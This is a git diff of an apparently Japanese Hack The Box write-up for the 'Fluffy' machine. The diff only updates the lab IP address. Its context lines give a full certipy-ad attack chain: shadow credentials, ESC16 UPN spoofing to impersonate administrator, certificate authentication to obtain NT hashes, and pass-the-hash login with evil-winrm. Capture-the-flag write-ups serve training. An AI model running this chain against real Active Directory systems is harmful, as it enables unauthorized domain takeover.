@@ -345,7 +345,7 @@ step3で侵害したwinrm_svcが所属するservice accountsグループはca_sv
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Fluffy_03.png">  
 ということで、ca_svcのtgtとntハッシュを取得
 ```sh
-└─$ certipy-ad shadow -u 'winrm_svc@fluffy.htb' -hashes 33bd09dcd697600edf6b3a7af4875767 -target-ip 10.129.250.233 -account ca_svc auto
+└─$ certipy-ad shadow -u 'winrm_svc@fluffy.htb' -hashes 33bd09dcd697600edf6b3a7af4875767 -target-ip 10.129.180.164 -account ca_svc auto
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
@@ -373,7 +373,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 脆弱性を調査すると、esc16を確認  
 esc16は拡張機能の無効の結果、upnが偽造することができユーザのなりすましが可能になる
 ```sh
-─$ certipy-ad find -stdout -target 10.129.250.233 -enabled -vulnerable -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8        
+─$ certipy-ad find -stdout -target 10.129.180.164 -enabled -vulnerable -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8        
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [*] Finding certificate templates
@@ -432,14 +432,14 @@ Certificate Templates                   : [!] Could not find any certificate tem
 またupnの変更はwrite権限が必要であり、step3およびstep4でwinrm_svcの所属先であるserviceaccountsグループはca_svcユーザに対してgenericwrite権限を有していることを確認した  
 ということでwinrm_svcユーザ権限でca_svcのupnをadministratorに変更する
 ```sh
-└─$ certipy-ad account -user ca_svc -upn administrator -dc-ip 10.129.250.233 -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 update
+└─$ certipy-ad account -user ca_svc -upn administrator -dc-ip 10.129.180.164 -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 update
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [*] Updating user 'ca_svc':
     userPrincipalName                   : administrator
 [*] Successfully updated 'ca_svc'
 
-└─$ certipy-ad account -user ca_svc -dc-ip 10.129.250.233 -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 read 
+└─$ certipy-ad account -user ca_svc -dc-ip 10.129.180.164 -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 read 
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [*] Reading attributes for 'ca_svc':
@@ -456,7 +456,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 ```
 拡張機能無効によるobjectsidの未検証により、upnに登録されたadministratorのpfxを取得した
 ```sh
-└─$ certipy-ad req -ca fluffy-DC01-CA  -template User -target-ip 10.129.250.233 -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8
+└─$ certipy-ad req -ca fluffy-DC01-CA  -template User -target-ip 10.129.180.164 -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
@@ -472,7 +472,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 ```
 このままだと偽装したupnと正規のupnが衝突するため、ca_svcのupnを元の設定に戻す
 ```sh
-└─$ certipy-ad account -user ca_svc -upn ca_svc@fluffy.htb -dc-ip 10.129.250.233 -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 update
+└─$ certipy-ad account -user ca_svc -upn ca_svc@fluffy.htb -dc-ip 10.129.180.164 -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 update
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [*] Updating user 'ca_svc':
@@ -481,7 +481,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 ```
 administratorのpfxを使用して、tgtとntハッシュを取得！
 ```sh
-└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.250.233 -domain fluffy.htb
+└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.180.164 -domain fluffy.htb
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [*] Certificate identities:
@@ -497,7 +497,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 winrmでログイン成功  
 ルートフラグゲット
 ```sh
-└─$ evil-winrm -i 10.129.232.88 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
+└─$ evil-winrm -i 10.129.180.164 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
                                         
 Evil-WinRM shell v3.7
                                         
